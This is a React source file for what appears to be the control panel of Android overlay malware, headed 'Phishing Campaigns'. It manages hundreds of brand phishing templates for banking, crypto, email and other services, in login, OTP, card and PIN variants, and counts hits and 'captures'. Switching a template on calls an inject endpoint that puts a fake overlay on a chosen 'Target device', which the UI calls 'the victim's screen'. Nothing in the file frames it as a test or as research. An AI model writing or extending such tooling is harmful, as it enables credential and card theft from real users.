import { useCallback, useEffect, useState } from 'react';
import { ShieldAlert, Search, RefreshCw, Smartphone, Plus } from 'lucide-react';

/* ---------------- api helper (same origin) ---------------- */

async function api<T = any>(path: string, init?: RequestInit): Promise<T> {
  const res = await fetch(path, {
    headers: { 'Content-Type': 'application/json' },
    ...init,
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`);
  return data as T;
}

/* ---------------- types ---------------- */

interface PhishPage {
  id: number;
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
  hits: number;
  enabled: number;
  createdAt: string;
  url: string;
}

interface Device {
  id: string;
  name: string;
  online?: boolean;
}

interface Stats {
  pages: number; enabled: number; hits: number;
  captures: number; last24h: number; variants: number;
}

type MsgType = 'ok' | 'warn' | 'err';
type Msg = { type: MsgType; text: string } | null;

/* ---------------- brand avatar palette ---------------- */

const PALETTE = ['#6366f1', '#8b5cf6', '#ec4899', '#f43f5e', '#f59e0b',
  '#10b981', '#06b6d4', '#3b82f6', '#84cc16', '#ef4444'];

function brandColor(brand: string): string {
  let h = 0;
  for (const c of brand) h = (h * 31 + c.charCodeAt(0)) >>> 0;
  return PALETTE[h % PALETTE.length];
}

const VARIANT_STYLE: Record<string, string> = {
  login: 'bg-blue-500/15 text-blue-400 border-blue-500/30',
  verify: 'bg-violet-500/15 text-violet-400 border-violet-500/30',
  otp: 'bg-amber-500/15 text-amber-400 border-amber-500/30',
  card: 'bg-rose-500/15 text-rose-400 border-rose-500/30',
  pin: 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30',
};

const CATEGORIES = ['all', 'banking', 'social', 'streaming', 'shopping', 'email',
  'delivery', 'security', 'crypto', 'telecom', 'gaming', 'saas'];

/* ---------------- page ---------------- */

export default function PhishingPage() {
  const [pages, setPages] = useState<PhishPage[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [search, setSearch] = useState('');
  const [category, setCategory] = useState('all');
  const [stats, setStats] = useState<Stats | null>(null);
  const [devices, setDevices] = useState<Device[]>([]);
  const [deviceId, setDeviceId] = useState('');
  const [loading, setLoading] = useState(false);
  const [busyId, setBusyId] = useState<number | null>(null);
  const [msg, setMsg] = useState<Msg>(null);

  const showMsg = (type: MsgType, text: string) => {
    setMsg({ type, text });
    window.setTimeout(() => setMsg(null), 4500);
  };

  /* ---------------- data ---------------- */

  const fetchStats = useCallback(async () => {
    try {
      const r = await api<{ success: boolean; data: Stats }>('/api/phishing/stats');
      setStats(r.data);
    } catch { /* stats optional */ }
  }, []);

  const fetchPages = useCallback(async () => {
    setLoading(true);
    try {
      const q = new URLSearchParams({ page: String(page), pageSize: '100' });
      if (search.trim()) q.set('search', search.trim());
      if (category !== 'all') q.set('category', category);
      const r = await api<{ success: boolean; data: { pages: PhishPage[]; total: number } }>(
        `/api/phishing/pages?${q}`
      );
      setPages(r.data.pages);
      setTotal(r.data.total);
    } catch (e) {
      showMsg('err', (e as Error).message);
    } finally {
      setLoading(false);
    }
  }, [page, search, category]);

  const fetchDevices = useCallback(async () => {
    try {
      const d = await api<any>('/api/devices');
      const list = Array.isArray(d) ? d : d?.devices ?? d?.data ?? [];
      setDevices(list.map((it: any) => ({
        id: it.id ?? it.deviceId ?? it.socketId,
        name: it.name ?? it.model ?? it.deviceName ?? 'Device',
        online: it.online ?? true,
      })));
    } catch { /* leave empty until wired */ }
  }, []);

  useEffect(() => {
    fetchDevices();
    fetchStats();
  }, [fetchDevices, fetchStats]);

  useEffect(() => {
    const t = window.setTimeout(fetchPages, 250);
    return () => window.clearTimeout(t);
  }, [fetchPages]);

  useEffect(() => {
    const t = window.setInterval(() => {
      fetchStats();
      fetchPages();
    }, 20000);
    return () => window.clearInterval(t);
  }, [fetchStats, fetchPages]);

  /* ---------------- actions ---------------- */

  const seed = async () => {
    try {
      const r = await api<{ success: boolean; data: { created: number; total: number } }>(
        '/api/phishing/seed', { method: 'POST' }
      );
      showMsg('ok', `Seeded ${r.data.created} new pages — ${r.data.total} total`);
      fetchStats();
      fetchPages();
    } catch (e) {
      showMsg('err', (e as Error).message);
    }
  };

  const toggle = async (p: PhishPage, on: boolean) => {
    setBusyId(p.id);
    try {
      await api(`/api/phishing/pages/${p.id}`, {
        method: 'PATCH',
        body: JSON.stringify({ enabled: on ? 1 : 0 }),
      });
      if (on) {
        if (deviceId) {
          try {
            await api('/api/phishing/inject', {
              method: 'POST',
              body: JSON.stringify({ deviceId, slug: p.slug }),
            });
            const dev = devices.find((d) => d.id === deviceId);
            showMsg('ok', `Overlay injected on ${dev?.name ?? deviceId}`);
          } catch (e) {
            showMsg('warn', `${p.brand} enabled — inject: ${(e as Error).message}`);
          }
        } else {
          showMsg('warn', `${p.brand} enabled — select a device to inject`);
        }
      } else {
        showMsg('ok', `${p.brand} disabled`);
      }
      fetchStats();
      fetchPages();
    } catch (e) {
      showMsg('err', (e as Error).message);
    } finally {
      setBusyId(null);
    }
  };

  /* ---------------- render ---------------- */

  const totalPages = Math.max(1, Math.ceil(total / 100));
  const selectedDevice = devices.find((d) => d.id === deviceId);

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100">
      {/* header */}
      <div className="border-b border-slate-800/80 bg-slate-900/40 px-6 py-5">
        <div className="mx-auto flex max-w-6xl flex-wrap items-center gap-4">
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-rose-500/15 text-rose-400">
            <ShieldAlert size={22} />
          </div>
          <div className="mr-auto">
            <h1 className="text-lg font-bold">Phishing Campaigns</h1>
            <p className="text-xs text-slate-400">Brand pages · overlay injector · capture logs</p>
          </div>
          <button
            onClick={seed}
            className="flex items-center gap-2 rounded-lg bg-blue-600 px-4 py-2 text-sm font-semibold hover:bg-blue-500"
          >
            <Plus size={16} /> Seed pages
          </button>
          <button
            onClick={() => { fetchStats(); fetchPages(); }}
            className="flex items-center gap-2 rounded-lg border border-slate-700 bg-slate-900 px-4 py-2 text-sm hover:bg-slate-800"
          >
            <RefreshCw size={15} /> Refresh
          </button>
        </div>
      </div>

      <div className="mx-auto max-w-6xl px-6 py-6 space-y-6">
        {/* status line */}
        {msg && (
          <div className={`rounded-lg border px-4 py-2.5 text-sm ${
            msg.type === 'ok' ? 'border-emerald-500/40 bg-emerald-500/10 text-emerald-300'
            : msg.type === 'warn' ? 'border-amber-500/40 bg-amber-500/10 text-amber-300'
            : 'border-rose-500/40 bg-rose-500/10 text-rose-300'
          }`}>
            {msg.text}
          </div>
        )}

        {/* device select */}
        <div className="flex flex-wrap items-center gap-4 rounded-xl border border-slate-800 bg-slate-900/50 p-4">
          <div className="flex items-center gap-2 text-sm font-semibold text-slate-300">
            <Smartphone size={16} className="text-blue-400" />
            Target device
          </div>
          <select
            value={deviceId}
            onChange={(e) => setDeviceId(e.target.value)}
            className="rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 text-sm outline-none focus:border-blue-500"
          >
            <option value="">— no device selected —</option>
            {devices.map((d) => (
              <option key={d.id} value={d.id}>
                {d.name}{d.online === false ? ' (offline)' : ''}
              </option>
            ))}
          </select>
          {selectedDevice ? (
            <span className="flex items-center gap-1.5 rounded-full bg-emerald-500/10 px-3 py-1 text-xs font-semibold text-emerald-400">
              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400" /> Inject on: {selectedDevice.name}
            </span>
          ) : (
            <span className="text-xs text-slate-500">
              Select a device, then switch a page ON — overlay appears instantly on the victim's screen.
            </span>
          )}
        </div>

        {/* compact stats */}
        <div className="grid grid-cols-2 gap-3 sm:grid-cols-5">
          {[
            ['Pages', stats?.pages ?? 0],
            ['Enabled', stats?.enabled ?? 0],
            ['Total hits', stats?.hits ?? 0],
            ['Captures', stats?.captures ?? 0],
            ['Last 24h', stats?.last24h ?? 0],
          ].map(([label, value]) => (
            <div key={label as string} className="rounded-xl border border-slate-800 bg-slate-900/50 px-4 py-3">
              <div className="text-xs text-slate-500">{label}</div>
              <div className="mt-0.5 text-xl font-bold text-slate-100">{value}</div>
            </div>
          ))}
        </div>

        {/* filters */}
        <div className="flex flex-wrap items-center gap-3">
          <div className="relative min-w-[220px] flex-1">
            <Search size={15} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
            <input
              value={search}
              onChange={(e) => { setSearch(e.target.value); setPage(1); }}
              placeholder="Search brand or slug…"
              className="w-full rounded-lg border border-slate-800 bg-slate-900/60 py-2 pl-9 pr-3 text-sm outline-none placeholder:text-slate-600 focus:border-blue-500"
            />
          </div>
          <select
            value={category}
            onChange={(e) => { setCategory(e.target.value); setPage(1); }}
            className="rounded-lg border border-slate-800 bg-slate-900/60 px-3 py-2 text-sm capitalize outline-none focus:border-blue-500"
          >
            {CATEGORIES.map((c) => <option key={c} value={c}>{c}</option>)}
          </select>
          <span className="text-xs text-slate-500">{total} pages · {stats?.variants ?? 0} templates</span>
        </div>

        {/* page cards */}
        {loading && pages.length === 0 ? (
          <div className="rounded-xl border border-slate-800 bg-slate-900/40 p-10 text-center text-sm text-slate-500">
            Loading…
          </div>
        ) : pages.length === 0 ? (
          <div className="rounded-xl border border-slate-800 bg-slate-900/40 p-10 text-center">
            <p className="text-sm text-slate-400">No pages yet — click <span className="font-semibold text-blue-400">Seed pages</span> to generate 430 brand templates.</p>
          </div>
        ) : (
          <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-3">
            {pages.map((p) => {
              const color = brandColor(p.brand);
              const on = p.enabled === 1;
              const busy = busyId === p.id;
              return (
                <div key={p.id} className={`flex items-center gap-3 rounded-xl border p-4 transition-colors ${
                  on ? 'border-emerald-500/40 bg-emerald-500/5' : 'border-slate-800 bg-slate-900/50'
                }`}>
                  {/* logo */}
                  <div
                    className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl text-lg font-extrabold text-white shadow-lg"
                    style={{ background: color }}
                  >
                    {p.brand[0]?.toUpperCase()}
                  </div>
                  {/* info */}
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2">
                      <span className="truncate text-sm font-semibold text-slate-100">{p.brand}</span>
                      <span className={`rounded-full border px-2 py-0.5 text-[10px] font-semibold ${VARIANT_STYLE[p.variant] ?? 'bg-slate-700/40 text-slate-300 border-slate-600/40'}`}>
                        {p.variant}
                      </span>
                    </div>
                    <div className="mt-0.5 flex items-center gap-2 text-[11px] text-slate-500">
                      <span className="capitalize">{p.category}</span>·
                      <span>{p.hits} hits</span>·
                      <span className="truncate">{p.slug}</span>
                    </div>
                  </div>
                  {/* toggle = enable + inject */}
                  <button
                    onClick={() => toggle(p, !on)}
                    disabled={busy}
                    title={on ? 'Disable page' : 'Enable + inject overlay'}
                    className={`relative h-6 w-11 shrink-0 rounded-full transition-colors disabled:opacity-50 ${
                      on ? 'bg-emerald-500' : 'bg-slate-700'
                    }`}
                  >
                    <span className={`absolute top-0.5 h-5 w-5 rounded-full bg-white shadow transition-all ${on ? 'left-[22px]' : 'left-0.5'}`} />
                  </button>
                </div>
              );
            })}
          </div>
        )}

        {/* pagination */}
        {total > 0 && (
          <div className="flex items-center justify-between text-sm text-slate-400">
            <span>Page {page} of {totalPages} · {total} total</span>
            <div className="flex gap-2">
              <button
                disabled={page <= 1}
                onClick={() => setPage((p) => Math.max(1, p - 1))}
                className="rounded-lg border border-slate-800 bg-slate-900 px-4 py-1.5 disabled:opacity-40 hover:bg-slate-800"
              >
                Prev
              </button>
              <button
                disabled={page >= totalPages}
                onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                className="rounded-lg border border-slate-800 bg-slate-900 px-4 py-1.5 disabled:opacity-40 hover:bg-slate-800"
              >
                Next
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
